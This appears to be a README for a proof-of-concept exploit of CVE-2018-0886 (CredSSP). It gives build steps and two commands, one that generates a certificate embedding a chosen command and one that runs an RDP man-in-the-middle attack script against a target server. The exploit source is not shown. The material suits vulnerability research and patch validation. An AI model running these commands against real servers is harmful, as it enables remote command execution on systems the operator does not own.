# credssp
A code demonstrating CVE-2018-0886

This is a code used for exploition this vulnerability, and it should be used for educational purposes only.

Written by Eyal Karni, Preempt 
ekarni@preempt.com 

# Build

## Instructions (Linux)
If you are using Ubuntu 14 , check the install file.. 
It was tested on Ubuntu 16.04. 

```
$ git clone https://github.com/preempt/rdpy.git rdpy
$ git clone https://github.com/preempt/credssp.git 
$ cd credssp/install
$ sh install.sh
$ cd ../../rdpy
$ sudo python setup.py install
```

# Running the exploit 


Export a certificate suitable for Server Authentication from any domain.


To generate a suitable certificate for the command to execute : 

```
$ python credssp/bin/gen_cmd.py -c ExportedCert -o exploitc.pem -k exploitk.pem CMD 
```

To run the attack script: 

```
$ python /usr/local/bin/rdpy-rpdcredsspmitm.py -k exploitk.pem -c exploitc.pem TargetServer
```
